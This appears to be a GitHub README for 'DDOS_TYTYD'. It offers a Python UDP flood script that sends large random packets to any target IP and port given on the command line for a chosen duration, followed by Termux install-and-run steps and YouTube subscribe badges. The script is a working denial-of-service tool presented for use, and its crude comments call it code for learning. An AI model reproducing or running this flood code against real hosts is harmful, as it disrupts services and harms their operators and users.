# DDOS_TYTYD
V1 and V2 DDOS Tools

```js
#Buat Belajar Jan Dec Mulu Kontol
import os,sys,time,socket,random,string,optparse
import requests
from requests import post,get,put

#Kasi Logo Seterah
def usage():
    print ("Logo Seterah")

def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print (f"bla bla")

def main():
    try:
          print (len(sys.argv))
          if len(sys.argv) != 4:
             usage()
          else:
             flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    except IndexError:
          sys.exit("use:python ddos.py bla")
if __name__ == '__main__':
    main()
```

<details open>
  <summary><strong> Install Package + Run Script </strong></summary>

  ```bash
  pkg update && pkg upgrade
  pkg install nano
  pkg install git
  pkg install python
  pip install colorama requests bs4 
  git clone https://github.com/AmmarrBN/DDOS_TYTYD
  cd DDOS_TYTYD
  python ddos_tytyd.py
  ```
  </details>

> SUBSCRIBE MY CHANNEL >_<

[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Ammar%20Executed&color=green)](https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ)
[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Ammar%20Executed&color=green)](https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ)


[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Lord%20Ganz&color=green)](https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ)
[![](https://img.shields.io/static/v1?logo=youtube&label=subscribe&message=Lord%20Ganz&color=green)](https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ)

```

